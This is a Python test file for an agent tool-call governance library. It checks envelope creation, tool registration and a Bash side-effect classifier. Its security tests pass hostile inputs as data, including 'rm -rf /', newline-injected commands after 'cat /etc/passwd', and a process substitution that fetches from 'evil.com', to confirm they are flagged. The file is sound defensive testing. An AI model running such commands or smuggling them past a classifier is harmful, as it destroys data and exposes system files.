"""Tests for ToolEnvelope, create_envelope, ToolRegistry, BashClassifier."""

from __future__ import annotations

import pytest

from edictum.envelope import (
    BashClassifier,
    SideEffect,
    ToolRegistry,
    create_envelope,
)


class TestCreateEnvelope:
    def test_deep_copy_isolation(self):
        original = {"nested": {"key": "value"}, "list": [1, 2, 3]}
        envelope = create_envelope("TestTool", original)
        original["nested"]["key"] = "mutated"
        original["list"].append(4)
        assert envelope.args["nested"]["key"] == "value"
        assert envelope.args["list"] == [1, 2, 3]

    def test_metadata_deep_copy(self):
        meta = {"info": {"nested": True}}
        envelope = create_envelope("TestTool", {}, metadata=meta)
        meta["info"]["nested"] = False
        assert envelope.metadata["info"]["nested"] is True

    def test_frozen_immutability(self):
        envelope = create_envelope("TestTool", {"key": "value"})
        with pytest.raises(AttributeError):
            envelope.tool_name = "Modified"

    def test_factory_defaults(self):
        envelope = create_envelope("TestTool", {})
        assert envelope.tool_name == "TestTool"
        assert envelope.args == {}
        assert envelope.run_id == ""
        assert envelope.call_index == 0
        assert envelope.side_effect == SideEffect.IRREVERSIBLE
        assert envelope.idempotent is False
        assert envelope.environment == "production"
        assert envelope.call_id  # should be a UUID

    def test_run_id_and_call_index(self):
        envelope = create_envelope("TestTool", {}, run_id="run-1", call_index=5)
        assert envelope.run_id == "run-1"
        assert envelope.call_index == 5

    def test_bash_command_extraction(self):
        envelope = create_envelope("Bash", {"command": "ls -la /tmp"})
        assert envelope.bash_command == "ls -la /tmp"
        assert envelope.side_effect == SideEffect.READ

    def test_read_file_path_extraction(self):
        envelope = create_envelope("Read", {"file_path": "/tmp/test.txt"})
        assert envelope.file_path == "/tmp/test.txt"

    def test_write_file_path_extraction(self):
        envelope = create_envelope("Write", {"file_path": "/tmp/out.txt"})
        assert envelope.file_path == "/tmp/out.txt"

    def test_camel_case_file_path(self):
        envelope = create_envelope("Read", {"filePath": "/tmp/test.txt"})
        assert envelope.file_path == "/tmp/test.txt"

    def test_camel_case_write_file_path(self):
        envelope = create_envelope("Edit", {"filePath": "/app/.env"})
        assert envelope.file_path == "/app/.env"

    def test_glob_path_extraction(self):
        envelope = create_envelope("Glob", {"path": "/src"})
        assert envelope.file_path == "/src"

    def test_non_serializable_args_fallback(self):
        """Falls back to copy.deepcopy for non-JSON-serializable args."""

        class Custom:
            def __init__(self, val):
                self.val = val

        envelope = create_envelope("TestTool", {"obj": Custom(42)})
        assert envelope.args["obj"].val == 42

    def test_with_registry(self):
        registry = ToolRegistry()
        registry.register("MyTool", SideEffect.READ, idempotent=True)
        envelope = create_envelope("MyTool", {}, registry=registry)
        assert envelope.side_effect == SideEffect.READ
        assert envelope.idempotent is True


class TestToolRegistry:
    def test_unregistered_defaults_to_irreversible(self):
        registry = ToolRegistry()
        side_effect, idempotent = registry.classify("Unknown", {})
        assert side_effect == SideEffect.IRREVERSIBLE
        assert idempotent is False

    def test_registered_tool(self):
        registry = ToolRegistry()
        registry.register("SafeTool", SideEffect.PURE, idempotent=True)
        side_effect, idempotent = registry.classify("SafeTool", {})
        assert side_effect == SideEffect.PURE
        assert idempotent is True

    def test_register_defaults(self):
        registry = ToolRegistry()
        registry.register("WriteTool")
        side_effect, idempotent = registry.classify("WriteTool", {})
        assert side_effect == SideEffect.WRITE
        assert idempotent is False


class TestBashClassifier:
    def test_empty_command_is_read(self):
        assert BashClassifier.classify("") == SideEffect.READ
        assert BashClassifier.classify("   ") == SideEffect.READ

    def test_allowlist_exact_match(self):
        assert BashClassifier.classify("ls") == SideEffect.READ
        assert BashClassifier.classify("pwd") == SideEffect.READ
        assert BashClassifier.classify("whoami") == SideEffect.READ

    def test_allowlist_with_args(self):
        assert BashClassifier.classify("ls -la /tmp") == SideEffect.READ
        assert BashClassifier.classify("git status") == SideEffect.READ
        assert BashClassifier.classify("git log --oneline") == SideEffect.READ
        assert BashClassifier.classify("cat /etc/hosts") == SideEffect.READ

    def test_shell_operators_force_irreversible(self):
        assert BashClassifier.classify("echo hello > file.txt") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cat file.txt | grep x") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cmd1 && cmd2") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cmd1 || cmd2") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cmd1 ; cmd2") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("echo $(whoami)") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("echo `whoami`") == SideEffect.IRREVERSIBLE

    def test_unknown_commands_are_irreversible(self):
        assert BashClassifier.classify("rm -rf /") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("python script.py") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("curl https://example.com") == SideEffect.IRREVERSIBLE

    def test_env_not_in_allowlist(self):
        assert BashClassifier.classify("env") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("printenv") == SideEffect.IRREVERSIBLE

    def test_git_read_commands(self):
        assert BashClassifier.classify("git diff HEAD~1") == SideEffect.READ
        assert BashClassifier.classify("git show abc123") == SideEffect.READ
        assert BashClassifier.classify("git branch -a") == SideEffect.READ
        assert BashClassifier.classify("git remote -v") == SideEffect.READ
        assert BashClassifier.classify("git tag") == SideEffect.READ

    def test_git_write_commands_are_irreversible(self):
        assert BashClassifier.classify("git push") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("git commit -m 'x'") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("git checkout main") == SideEffect.IRREVERSIBLE


@pytest.mark.security
class TestBashClassifierBypassVectors:
    """Security: shell metacharacter bypass vectors."""

    def test_newline_injection_classified_irreversible(self):
        assert BashClassifier.classify("cat /etc/passwd\nrm -rf /") == SideEffect.IRREVERSIBLE

    def test_carriage_return_injection_classified_irreversible(self):
        assert BashClassifier.classify("cat /etc/passwd\rrm -rf /") == SideEffect.IRREVERSIBLE

    def test_process_substitution_classified_irreversible(self):
        assert BashClassifier.classify("cat <(curl http://evil.com)") == SideEffect.IRREVERSIBLE

    def test_heredoc_classified_irreversible(self):
        assert BashClassifier.classify("cat << EOF") == SideEffect.IRREVERSIBLE

    def test_variable_expansion_classified_irreversible(self):
        assert BashClassifier.classify("echo ${PATH}") == SideEffect.IRREVERSIBLE

    def test_combined_bypass_attempt(self):
        assert BashClassifier.classify("cat /tmp/safe\nrm -rf / << EOF") == SideEffect.IRREVERSIBLE

    def test_existing_operators_still_work(self):
        """Regression guard: all original operators still trigger IRREVERSIBLE."""
        assert BashClassifier.classify("echo hello > file.txt") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cat file.txt | grep x") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cmd1 && cmd2") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cmd1 || cmd2") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cmd1 ; cmd2") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("echo $(whoami)") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("echo `whoami`") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("cat >> file.txt") == SideEffect.IRREVERSIBLE
        assert BashClassifier.classify("echo #{var}") == SideEffect.IRREVERSIBLE

    def test_clean_read_commands_still_read(self):
        """Regression guard: clean read commands still classify as READ."""
        assert BashClassifier.classify("cat /tmp/file") == SideEffect.READ
        assert BashClassifier.classify("ls -la") == SideEffect.READ
        assert BashClassifier.classify("grep foo bar") == SideEffect.READ
        assert BashClassifier.classify("git status") == SideEffect.READ


@pytest.mark.security
class TestToolNameValidation:
    """Security: tool_name validation rejects dangerous characters."""

    def test_tool_name_with_null_byte_rejected(self):
        with pytest.raises(ValueError, match="Invalid tool_name"):
            create_envelope("tool\x00name", {})

    def test_tool_name_with_newline_rejected(self):
        with pytest.raises(ValueError, match="Invalid tool_name"):
            create_envelope("tool\nname", {})

    def test_tool_name_with_path_separator_rejected(self):
        with pytest.raises(ValueError, match="Invalid tool_name"):
            create_envelope("path/to/tool", {})

    def test_tool_name_empty_string_rejected(self):
        with pytest.raises(ValueError, match="Invalid tool_name"):
            create_envelope("", {})

    def test_tool_name_normal_names_accepted(self):
        """Common tool name formats should all work."""
        # These should not raise
        create_envelope("Bash", {})
        create_envelope("file.read", {})
        create_envelope("google-search", {})
        create_envelope("my_tool:v2", {})
        create_envelope("Tool123", {})


class TestSideEffect:
    def test_enum_values(self):
        assert SideEffect.PURE.value == "pure"
        assert SideEffect.READ.value == "read"
        assert SideEffect.WRITE.value == "write"
        assert SideEffect.IRREVERSIBLE.value == "irreversible"

    def test_string_behavior(self):
        assert SideEffect.PURE == "pure"
        assert SideEffect("read") == SideEffect.READ
